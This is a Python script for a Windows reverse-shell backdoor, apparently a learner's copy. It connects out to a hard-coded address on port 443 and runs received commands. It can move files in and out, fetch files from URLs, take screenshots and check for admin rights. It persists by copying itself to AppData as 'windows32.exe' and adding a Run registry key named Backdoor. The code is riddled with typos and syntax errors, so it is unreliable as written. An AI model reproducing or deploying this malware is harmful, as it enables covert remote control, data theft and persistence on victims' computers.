#!/usr/bin/python

import socket
import subprocess
import json
import base64
import os
import shutil
import sys
import time
import requests
from mss import mss

def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                       continue

def is _admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\Windows'),'temp']))
	except:
		admin = "[!!] User Privileges!"
	else:
		admin = "[+] Administrator Privileges!"

def screenshot():
	with mss() as screenshot:
		screenshot.shot()


def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def connection():
	while True:
		time.sleep(10)
		try:
			sock.coonet(("192.168.37.201",443))
			shell()
		except:
			sonnection()

def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			break
		elif command == "help":
			help_options = '''					download path --> Download A File From Target PC
					upload path --> Upload A File To Target PC
					get url     --> Download A File To Target PC From Any Website
					start path  --> Start A Program On Target PC
					screenshot  --> Take A Screenshot Of Targets Monitor
					check       --> Check For The Administrator Privileges
					q           --> Exit The Reverse Shell '''
			reliable_send(help_opt)
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue

		elif command[:8] == "download":
                        with open(command[9:], "rb") as file:
                               reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                                with open(command[7:], "wb") as fin:
					file_data = reliable_recv()
					fin.write(base64.b64encode(fin.data()))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded File From Specified URL!")
			except:
				reliable_send("[!!] Failed To Download That File")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png","rb") as sc:
					realible_send(base64.b64encode(sc.read)))
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!] Failed To Take Screenshot")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started!")
			except:
				reliable_send("[!!] Failed To Start")
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Cannot Perform The Check")
		else:
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(result)


location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVerion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
shell()
sock.close()
